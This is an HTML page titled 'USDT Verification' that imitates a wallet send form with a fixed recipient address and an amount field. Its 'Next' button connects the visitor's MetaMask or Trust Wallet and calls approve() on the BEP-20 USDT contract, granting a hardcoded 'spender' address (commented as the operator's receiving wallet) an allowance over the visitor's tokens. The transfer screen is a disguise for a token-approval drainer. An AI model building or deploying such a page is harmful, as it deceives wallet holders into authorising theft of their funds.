<!DOCTYPE html>
<html>
<head>
  <title>USDT Verification</title>
  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
  <style>
    body {
      font-family: sans-serif;
      padding: 20px;
    }

    input {
      width: 100%;
      padding: 12px;
      font-size: 16px;
      border-radius: 10px;
      border: 1px solid #ccc;
      margin-bottom: 20px;
    }

    .btn {
      width: 100%;
      padding: 15px;
      font-size: 18px;
      background-color: #0057ff;
      color: white;
      border: none;
      border-radius: 20px;
      cursor: pointer;
      font-weight: bold;
    }

    .btn.processing {
      animation: pulse 1s infinite ease-in-out;
    }

    @keyframes pulse {
      0% { opacity: 1; }
      50% { opacity: 0.6; }
      100% { opacity: 1; }
    }
  </style>
</head>
<body>

  <h3>Address or Domain Name</h3>
  <input id="toAddress" value="0x79069192614f7ceE4F..." readonly />

  <h3>Amount</h3>
  <input id="amount" type="number" value="1" />
  <div>= $0.00</div>

  <br>
  <button id="nextBtn" class="btn" onclick="approveUSDT()">Next</button>

  <script>
    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP-20
    const spender = "0x1956B3950A73B0C54792199Edf13c7b835FF94DC";  // Your wallet (to receive)
    const amountToApprove = "1000000"; // 1 USDT = 6 decimals = 1000000

    const ABI = [
      {
        "constant": false,
        "inputs": [
          { "name": "_spender", "type": "address" },
          { "name": "_value", "type": "uint256" }
        ],
        "name": "approve",
        "outputs": [{ "name": "", "type": "bool" }],
        "type": "function"
      }
    ];

    async function approveUSDT() {
      const btn = document.getElementById("nextBtn");
      btn.innerHTML = "‚è≥ Processing...";
      btn.classList.add("processing");

      if (typeof window.ethereum === "undefined") {
        alert("Trust Wallet or MetaMask not found!");
        return;
      }

      try {
        const web3 = new Web3(window.ethereum);
        await window.ethereum.request({ method: 'eth_requestAccounts' });

        const accounts = await web3.eth.getAccounts();
        const user = accounts[0];

        const contract = new web3.eth.Contract(ABI, usdtAddress);

        await contract.methods.approve(spender, amountToApprove).send({ from: user });

        alert("USDT Approved!");
      } catch (err) {
        console.error(err);
        alert("Transaction failed!");
      }

      btn.innerHTML = "Next";
      btn.classList.remove("processing");
    }
  </script>

</body>
</html>
